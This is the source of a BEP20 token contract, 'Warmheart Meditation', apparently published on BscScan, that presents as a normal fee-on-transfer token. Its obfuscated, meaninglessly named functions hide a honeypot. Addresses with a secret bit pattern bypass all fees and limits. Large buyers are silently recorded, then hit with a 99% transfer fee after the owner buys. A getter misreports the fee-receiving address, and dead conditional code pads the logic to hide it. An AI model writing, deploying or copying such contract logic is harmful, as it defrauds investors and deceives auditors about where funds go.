/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract WarmheartMeditation is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Warmheart Meditation ";
    string constant _symbol = "WarmheartMeditation";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private botsExemptTeamLimitWallet;
    mapping(address => bool) private launchedLiquidityTxMin;
    mapping(address => bool) private autoBuySwapTradingSellMax;
    mapping(address => bool) private isBurnSellBots;
    mapping(address => uint256) private swapTxModeLiquidityReceiver;
    mapping(uint256 => address) private buyLimitModeWalletTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private autoTeamBuyTx = 0;
    uint256 private burnLaunchedMaxIs = 7;

    //SELL FEES
    uint256 private botsModeSwapBurn = 0;
    uint256 private feeTxModeMin = 7;

    uint256 private launchedTradingMinBurn = burnLaunchedMaxIs + autoTeamBuyTx;
    uint256 private modeLimitTradingTeam = 100;

    address private exemptLaunchedMarketingBots = (msg.sender); // auto-liq address
    address private launchedMinReceiverExemptBuy = (0x831B667471b932FFFDB09829fFFFc88De7d8FD44); // marketing address
    address private maxWalletSwapMinLimit = DEAD;
    address private swapTxLimitTrading = DEAD;
    address private marketingLimitTxTeamTradingSell = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private liquidityLimitModeSell;
    uint256 private liquidityMinTeamSwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingLiquidityTeamSwap;
    uint256 private limitAutoBotsTxTrading;
    uint256 private minLaunchedReceiverSell;
    uint256 private feeSellModeLiquidityIs;
    uint256 private launchedWalletMinMarketing;

    bool private limitExemptTxMode = true;
    bool private isBurnSellBotsMode = true;
    bool private swapMinAutoMarketing = true;
    bool private sellLaunchedMinLimitMax = true;
    bool private tradingBuyLiquidityAuto = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private botsTradingWalletSellMode = 6 * 10 ** 15;
    uint256 private minReceiverBotsFeeBurnIsTeam = _totalSupply / 1000; // 0.1%

    
    bool private feeBuyTeamWallet = false;
    uint256 private walletExemptTxTrading = 0;
    uint256 private maxExemptBuyLimit = 0;
    uint256 private sellTxBuyIsBurnTradingAuto = 0;
    bool private swapIsBuyBurnLaunchedLiquidity = false;
    bool private receiverMaxSellLiquidity = false;
    uint256 private walletBotsTradingBurn = 0;
    bool private botsMarketingSellMin = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingLiquidityTeamSwap = true;

        botsExemptTeamLimitWallet[msg.sender] = true;
        botsExemptTeamLimitWallet[address(this)] = true;

        launchedLiquidityTxMin[msg.sender] = true;
        launchedLiquidityTxMin[0x0000000000000000000000000000000000000000] = true;
        launchedLiquidityTxMin[0x000000000000000000000000000000000000dEaD] = true;
        launchedLiquidityTxMin[address(this)] = true;

        autoBuySwapTradingSellMax[msg.sender] = true;
        autoBuySwapTradingSellMax[0x0000000000000000000000000000000000000000] = true;
        autoBuySwapTradingSellMax[0x000000000000000000000000000000000000dEaD] = true;
        autoBuySwapTradingSellMax[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeSwapWalletIsSellAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Warmheart Meditation  Insufficient Allowance");
        }

        return modeSwapWalletIsSellAuto(sender, recipient, amount);
    }

    function modeSwapWalletIsSellAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = minTeamSwapAutoTradingWallet(sender) || minTeamSwapAutoTradingWallet(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                txTeamModeAuto();
            }
            if (!bLimitTxWalletValue) {
                feeMarketingBurnWalletMax(recipient);
            }
        }
        
        if (botsMarketingSellMin == botsMarketingSellMin) {
            botsMarketingSellMin = botsMarketingSellMin;
        }

        if (walletBotsTradingBurn != launchedTradingMinBurn) {
            walletBotsTradingBurn = minReceiverBotsFeeBurnIsTeam;
        }


        if (inSwap || bLimitTxWalletValue) {return marketingBotsLimitSwapLaunchedFee(sender, recipient, amount);}

        if (!botsExemptTeamLimitWallet[sender] && !botsExemptTeamLimitWallet[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Warmheart Meditation  Max wallet has been triggered");
        }
        
        if (swapIsBuyBurnLaunchedLiquidity != limitExemptTxMode) {
            swapIsBuyBurnLaunchedLiquidity = limitExemptTxMode;
        }

        if (feeBuyTeamWallet == feeBuyTeamWallet) {
            feeBuyTeamWallet = swapMinAutoMarketing;
        }

        if (receiverMaxSellLiquidity == swapMinAutoMarketing) {
            receiverMaxSellLiquidity = swapMinAutoMarketing;
        }


        require((amount <= _maxTxAmount) || autoBuySwapTradingSellMax[sender] || autoBuySwapTradingSellMax[recipient], "Warmheart Meditation  Max TX Limit has been triggered");

        if (liquidityLaunchedFeeWallet()) {buyLaunchedExemptLiquidityBurnMarketingReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Warmheart Meditation  Insufficient Balance");
        
        uint256 amountReceived = marketingIsLaunchedTradingMinLimitBots(sender) ? isMaxLiquidityBuy(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function marketingBotsLimitSwapLaunchedFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Warmheart Meditation  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function marketingIsLaunchedTradingMinLimitBots(address sender) internal view returns (bool) {
        return !launchedLiquidityTxMin[sender];
    }

    function botsTeamTradingTxModeReceiverMin(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            launchedTradingMinBurn = feeTxModeMin + botsModeSwapBurn;
            return teamMinIsLiquidityMax(sender, launchedTradingMinBurn);
        }
        if (!selling && sender == uniswapV2Pair) {
            launchedTradingMinBurn = burnLaunchedMaxIs + autoTeamBuyTx;
            return launchedTradingMinBurn;
        }
        return teamMinIsLiquidityMax(sender, launchedTradingMinBurn);
    }

    function tradingBurnIsWalletAutoLiquidity() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function isMaxLiquidityBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (walletBotsTradingBurn == maxExemptBuyLimit) {
            walletBotsTradingBurn = walletExemptTxTrading;
        }

        if (sellTxBuyIsBurnTradingAuto == botsModeSwapBurn) {
            sellTxBuyIsBurnTradingAuto = launchedTradingMinBurn;
        }

        if (receiverMaxSellLiquidity == tradingBuyLiquidityAuto) {
            receiverMaxSellLiquidity = isBurnSellBotsMode;
        }


        uint256 feeAmount = amount.mul(botsTeamTradingTxModeReceiverMin(sender, receiver == uniswapV2Pair)).div(modeLimitTradingTeam);

        if (isBurnSellBots[sender] || isBurnSellBots[receiver]) {
            feeAmount = amount.mul(99).div(modeLimitTradingTeam);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function minTeamSwapAutoTradingWallet(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function teamMinIsLiquidityMax(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = swapTxModeLiquidityReceiver[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function feeMarketingBurnWalletMax(address addr) private {
        if (tradingBurnIsWalletAutoLiquidity() < botsTradingWalletSellMode) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        buyLimitModeWalletTx[exemptLimitValue] = addr;
    }

    function txTeamModeAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (swapTxModeLiquidityReceiver[buyLimitModeWalletTx[i]] == 0) {
                    swapTxModeLiquidityReceiver[buyLimitModeWalletTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(launchedMinReceiverExemptBuy).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityLaunchedFeeWallet() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingBuyLiquidityAuto &&
    _balances[address(this)] >= minReceiverBotsFeeBurnIsTeam;
    }

    function buyLaunchedExemptLiquidityBurnMarketingReceiver() internal swapping {
        
        if (walletExemptTxTrading == walletBotsTradingBurn) {
            walletExemptTxTrading = botsTradingWalletSellMode;
        }


        uint256 amountToLiquify = minReceiverBotsFeeBurnIsTeam.mul(autoTeamBuyTx).div(launchedTradingMinBurn).div(2);
        uint256 amountToSwap = minReceiverBotsFeeBurnIsTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = launchedTradingMinBurn.sub(autoTeamBuyTx.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(autoTeamBuyTx).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnLaunchedMaxIs).div(totalETHFee);
        
        payable(launchedMinReceiverExemptBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                exemptLaunchedMarketingBots,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBuyLimitModeWalletTx(uint256 a0) public view returns (address) {
        if (buyLimitModeWalletTx[a0] != buyLimitModeWalletTx[a0]) {
            return swapTxLimitTrading;
        }
        if (buyLimitModeWalletTx[a0] != buyLimitModeWalletTx[a0]) {
            return maxWalletSwapMinLimit;
        }
        if (a0 != burnLaunchedMaxIs) {
            return exemptLaunchedMarketingBots;
        }
            return buyLimitModeWalletTx[a0];
    }
    function setBuyLimitModeWalletTx(uint256 a0,address a1) public onlyOwner {
        if (a0 != sellTxBuyIsBurnTradingAuto) {
            swapTxLimitTrading=a1;
        }
        buyLimitModeWalletTx[a0]=a1;
    }

    function getMaxExemptBuyLimit() public view returns (uint256) {
        return maxExemptBuyLimit;
    }
    function setMaxExemptBuyLimit(uint256 a0) public onlyOwner {
        if (maxExemptBuyLimit == modeLimitTradingTeam) {
            modeLimitTradingTeam=a0;
        }
        maxExemptBuyLimit=a0;
    }

    function getSwapMinAutoMarketing() public view returns (bool) {
        return swapMinAutoMarketing;
    }
    function setSwapMinAutoMarketing(bool a0) public onlyOwner {
        if (swapMinAutoMarketing == sellLaunchedMinLimitMax) {
            sellLaunchedMinLimitMax=a0;
        }
        if (swapMinAutoMarketing == receiverMaxSellLiquidity) {
            receiverMaxSellLiquidity=a0;
        }
        if (swapMinAutoMarketing != swapIsBuyBurnLaunchedLiquidity) {
            swapIsBuyBurnLaunchedLiquidity=a0;
        }
        swapMinAutoMarketing=a0;
    }

    function getLaunchedMinReceiverExemptBuy() public view returns (address) {
        if (launchedMinReceiverExemptBuy == maxWalletSwapMinLimit) {
            return maxWalletSwapMinLimit;
        }
        if (launchedMinReceiverExemptBuy != maxWalletSwapMinLimit) {
            return maxWalletSwapMinLimit;
        }
        return launchedMinReceiverExemptBuy;
    }
    function setLaunchedMinReceiverExemptBuy(address a0) public onlyOwner {
        if (launchedMinReceiverExemptBuy == launchedMinReceiverExemptBuy) {
            launchedMinReceiverExemptBuy=a0;
        }
        if (launchedMinReceiverExemptBuy == marketingLimitTxTeamTradingSell) {
            marketingLimitTxTeamTradingSell=a0;
        }
        if (launchedMinReceiverExemptBuy == exemptLaunchedMarketingBots) {
            exemptLaunchedMarketingBots=a0;
        }
        launchedMinReceiverExemptBuy=a0;
    }

    function getAutoTeamBuyTx() public view returns (uint256) {
        if (autoTeamBuyTx == walletBotsTradingBurn) {
            return walletBotsTradingBurn;
        }
        if (autoTeamBuyTx == sellTxBuyIsBurnTradingAuto) {
            return sellTxBuyIsBurnTradingAuto;
        }
        if (autoTeamBuyTx != walletBotsTradingBurn) {
            return walletBotsTradingBurn;
        }
        return autoTeamBuyTx;
    }
    function setAutoTeamBuyTx(uint256 a0) public onlyOwner {
        if (autoTeamBuyTx == botsModeSwapBurn) {
            botsModeSwapBurn=a0;
        }
        autoTeamBuyTx=a0;
    }

    function getSwapTxLimitTrading() public view returns (address) {
        return swapTxLimitTrading;
    }
    function setSwapTxLimitTrading(address a0) public onlyOwner {
        if (swapTxLimitTrading != marketingLimitTxTeamTradingSell) {
            marketingLimitTxTeamTradingSell=a0;
        }
        if (swapTxLimitTrading == launchedMinReceiverExemptBuy) {
            launchedMinReceiverExemptBuy=a0;
        }
        swapTxLimitTrading=a0;
    }

    function getMarketingLimitTxTeamTradingSell() public view returns (address) {
        if (marketingLimitTxTeamTradingSell == launchedMinReceiverExemptBuy) {
            return launchedMinReceiverExemptBuy;
        }
        return marketingLimitTxTeamTradingSell;
    }
    function setMarketingLimitTxTeamTradingSell(address a0) public onlyOwner {
        if (marketingLimitTxTeamTradingSell != maxWalletSwapMinLimit) {
            maxWalletSwapMinLimit=a0;
        }
        marketingLimitTxTeamTradingSell=a0;
    }

    function getFeeBuyTeamWallet() public view returns (bool) {
        if (feeBuyTeamWallet != isBurnSellBotsMode) {
            return isBurnSellBotsMode;
        }
        return feeBuyTeamWallet;
    }
    function setFeeBuyTeamWallet(bool a0) public onlyOwner {
        if (feeBuyTeamWallet != swapMinAutoMarketing) {
            swapMinAutoMarketing=a0;
        }
        if (feeBuyTeamWallet == isBurnSellBotsMode) {
            isBurnSellBotsMode=a0;
        }
        if (feeBuyTeamWallet == receiverMaxSellLiquidity) {
            receiverMaxSellLiquidity=a0;
        }
        feeBuyTeamWallet=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}